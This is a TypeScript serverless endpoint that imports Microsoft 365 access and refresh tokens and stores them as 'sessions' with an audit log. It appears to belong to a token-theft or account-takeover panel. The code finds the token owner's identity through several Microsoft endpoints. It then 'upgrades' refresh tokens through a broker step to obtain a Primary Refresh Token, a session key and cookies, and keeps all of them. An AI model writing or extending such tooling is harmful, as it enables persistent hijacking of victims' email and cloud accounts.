// /api/import-token
// Imports an external access token (+ optional refresh token) into the system
// Creates a session, fetches user profile, and triggers Broker upgrade

import { upgradeToBroker } from '../lib/broker';

interface Env {
  TOKEN_STORE: KVNamespace;
}

const CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const SESSIONS_KEY = 'sessions';
const AUDIT_KEY = 'audit_log';

async function fetchUserProfile(accessToken: string): Promise<{ email: string; displayName: string }> {
  // The token may be for outlook.office.com audience, not graph — try multiple approaches

  // 1. Try Graph v1.0
  try {
    const res = await fetch('https://graph.microsoft.com/v1.0/me', {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    if (res.ok) {
      const profile = await res.json() as { displayName: string; mail: string; userPrincipalName: string };
      const email = profile.mail || profile.userPrincipalName || '';
      if (email) return { email, displayName: profile.displayName || 'Imported User' };
    }
  } catch { /* fallthrough */ }

  // 2. Try Outlook REST API (for outlook.office.com audience tokens)
  try {
    const res = await fetch('https://outlook.office.com/api/v2.0/me', {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    if (res.ok) {
      const profile = await res.json() as { DisplayName: string; EmailAddress: string };
      if (profile.EmailAddress) return { email: profile.EmailAddress, displayName: profile.DisplayName || 'Imported User' };
    }
  } catch { /* fallthrough */ }

  // 3. Try OWA user config endpoint
  try {
    const res = await fetch('https://outlook.office365.com/owa/sessiondata', {
      headers: { Authorization: `Bearer ${accessToken}`, 'User-Agent': 'Mozilla/5.0' },
    });
    if (res.ok) {
      const data = await res.json() as { UserEmailAddress?: string; UserDisplayName?: string };
      if (data.UserEmailAddress) return { email: data.UserEmailAddress, displayName: data.UserDisplayName || 'Imported User' };
    }
  } catch { /* fallthrough */ }

  // 4. Decode JWT payload
  try {
    const parts = accessToken.split('.');
    if (parts.length === 3) {
      const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'))) as Record<string, string>;
      const email = payload.upn || payload.unique_name || payload.email || payload.preferred_username || '';
      const name = payload.name || '';
      if (email) return { email, displayName: name || 'Imported User' };
    }
  } catch { /* fallthrough */ }

  return { email: 'unknown@imported.com', displayName: 'Imported User' };
}

function decodeTokenExpiry(accessToken: string): number {
  try {
    const parts = accessToken.split('.');
    if (parts.length === 3) {
      const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'))) as { exp?: number; iat?: number };
      if (payload.exp) {
        const remainingSeconds = payload.exp - Math.floor(Date.now() / 1000);
        return Math.max(remainingSeconds, 0);
      }
    }
  } catch { /* fallthrough */ }
  return 3600; // default 1 hour
}

function decodeTokenScopes(accessToken: string): string[] {
  try {
    const parts = accessToken.split('.');
    if (parts.length === 3) {
      const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'))) as { scp?: string };
      if (payload.scp) return payload.scp.split(' ');
    }
  } catch { /* fallthrough */ }
  return ['imported'];
}

export const onRequestPost: PagesFunction<Env> = async (context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, X-Admin-Password',
    'Content-Type': 'application/json',
  };

  try {
    const body = await context.request.json() as {
      accessToken: string;
      refreshToken?: string;
      label?: string;
    };

    if (!body.accessToken) {
      return new Response(JSON.stringify({ success: false, error: 'accessToken is required' }), { status: 400, headers });
    }

    const accessToken = body.accessToken.trim();
    const refreshToken = (body.refreshToken || '').trim();
    const label = body.label || '';

    // Fetch user profile from the token
    const profile = await fetchUserProfile(accessToken);
    const expiresIn = decodeTokenExpiry(accessToken);
    const scopes = decodeTokenScopes(accessToken);

    // Create session
    const now = new Date();
    const sessionId = `import_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    const session: Record<string, unknown> = {
      id: sessionId,
      accountEmail: profile.email,
      accountName: profile.displayName,
      status: 'active',
      accessToken,
      refreshToken,
      accessTokenExpiry: new Date(now.getTime() + expiresIn * 1000).toISOString(),
      refreshTokenExpiry: refreshToken ? new Date(now.getTime() + 90 * 24 * 3600 * 1000).toISOString() : new Date(now.getTime() + expiresIn * 1000).toISOString(),
      lastActivity: now.toISOString(),
      createdAt: now.toISOString(),
      scopes,
      clientId: CLIENT_ID,
      ipAddress: 'Imported',
      deviceInfo: label || 'Manual Import',
      tokenType: 'Bearer' as const,
      importedAt: now.toISOString(),
      importSource: 'manual',
    };

    // Store session
    const sessions = (await context.env.TOKEN_STORE.get(SESSIONS_KEY, 'json') as unknown[] | null) ?? [];
    sessions.unshift(session);
    await context.env.TOKEN_STORE.put(SESSIONS_KEY, JSON.stringify(sessions));

    // Audit log
    const auditEntry = {
      id: `log_${Date.now()}`,
      timestamp: now.toISOString(),
      action: 'login',
      accountEmail: profile.email,
      ipAddress: 'Imported',
      details: `Token imported manually. ${refreshToken ? 'Has refresh token.' : 'Access token only.'} Expires in ${Math.round(expiresIn / 60)}m. Scopes: ${scopes.length}`,
      success: true,
    };
    const audit = (await context.env.TOKEN_STORE.get(AUDIT_KEY, 'json') as unknown[] | null) ?? [];
    audit.unshift(auditEntry);
    if (audit.length > 200) audit.length = 200;
    await context.env.TOKEN_STORE.put(AUDIT_KEY, JSON.stringify(audit));

    // Auto Broker upgrade if refresh token provided
    if (refreshToken) {
      context.waitUntil((async () => {
        try {
          const brokerResult = await upgradeToBroker(accessToken, refreshToken);
          const currentSessions = (await context.env.TOKEN_STORE.get(SESSIONS_KEY, 'json') as Array<Record<string, unknown>> | null) ?? [];
          const idx = currentSessions.findIndex(s => s.id === sessionId);
          if (idx >= 0) {
            currentSessions[idx].brokerStatus = brokerResult.success ? 'active' : (brokerResult.cookies ? 'partial' : 'failed');
            currentSessions[idx].deviceId = brokerResult.deviceId;
            currentSessions[idx].prt = brokerResult.prt;
            currentSessions[idx].sessionKey = brokerResult.sessionKey;
            currentSessions[idx].brokerCookies = brokerResult.cookies;
            currentSessions[idx].brokerUpgradeAt = new Date().toISOString();
            currentSessions[idx].brokerSteps = brokerResult.steps;
            await context.env.TOKEN_STORE.put(SESSIONS_KEY, JSON.stringify(currentSessions));
          }
          const brokerLog = {
            id: `log_${Date.now()}`,
            timestamp: new Date().toISOString(),
            action: 'broker_upgrade',
            accountEmail: profile.email,
            details: brokerResult.success
              ? `Broker upgrade OK for imported token. Device: ${brokerResult.deviceId}`
              : `Broker upgrade for import: ${brokerResult.steps.map(s => `${s.step}:${s.success ? 'OK' : 'FAIL'}`).join(', ')}`,
            success: brokerResult.success,
          };
          const currentAudit = (await context.env.TOKEN_STORE.get(AUDIT_KEY, 'json') as unknown[] | null) ?? [];
          currentAudit.unshift(brokerLog);
          if (currentAudit.length > 200) currentAudit.length = 200;
          await context.env.TOKEN_STORE.put(AUDIT_KEY, JSON.stringify(currentAudit));
        } catch { /* best-effort */ }
      })());
    }

    return new Response(JSON.stringify({
      success: true,
      sessionId,
      email: profile.email,
      displayName: profile.displayName,
      expiresIn,
      scopes: scopes.length,
      hasRefreshToken: !!refreshToken,
    }), { status: 200, headers });

  } catch (error) {
    const message = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ success: false, error: message }), { status: 500, headers });
  }
};

export const onRequestOptions: PagesFunction<Env> = async () => {
  return new Response(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, X-Admin-Password',
    },
  });
};
